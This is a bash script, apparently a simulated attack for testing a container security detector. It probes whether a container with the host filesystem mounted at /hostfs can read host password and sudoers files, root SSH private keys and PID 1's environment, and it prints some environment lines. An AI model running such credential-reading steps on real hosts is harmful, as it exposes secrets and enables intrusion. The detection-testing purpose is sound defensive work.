#!/bin/bash
# ATTACK 4 — Sensitive Host Filesystem Access
# A container with host filesystem mounted at /hostfs reads
# credentials, SSH keys, and host process environment variables.
set -e

echo "=== ATTACK 4: Sensitive Host Filesystem Access ==="
echo "PID: $$  Container: $(hostname)"
echo ""

# Step 1: Read host credential files
echo "[*] Reading host credentials via /hostfs..."
for f in /hostfs/etc/shadow /hostfs/etc/passwd /hostfs/etc/sudoers; do
    if [ -r "$f" ]; then
        echo "[!] EXFIL — $f ($(wc -l < "$f") lines)"
    else
        echo "[-] $f — not readable"
    fi
done

# Step 2: Read SSH keys
echo "[*] Checking SSH keys..."
for f in /hostfs/root/.ssh/authorized_keys /hostfs/root/.ssh/id_rsa /hostfs/root/.ssh/id_ed25519; do
    if [ -r "$f" ]; then
        echo "[!] EXFIL — $f"
    fi
done

# Step 3: Read host process environment
echo "[*] Reading host PID 1 environment..."
if [ -r /proc/1/environ ]; then
    echo "[!] EXFIL — /proc/1/environ readable"
    tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -5 | sed 's/^/    /'
else
    echo "[-] /proc/1/environ not readable"
fi

# Step 4: Enumerate host processes
echo "[*] Enumerating host processes via /proc..."
COUNT=0
for p in /proc/[0-9]*/cmdline; do
    [ -r "$p" ] && COUNT=$((COUNT + 1))
done
echo "[!] EXFIL — enumerated $COUNT host process command lines"

echo ""
echo "=== Attack complete — check detector for SENSITIVE-FS-ACCESS alerts ==="
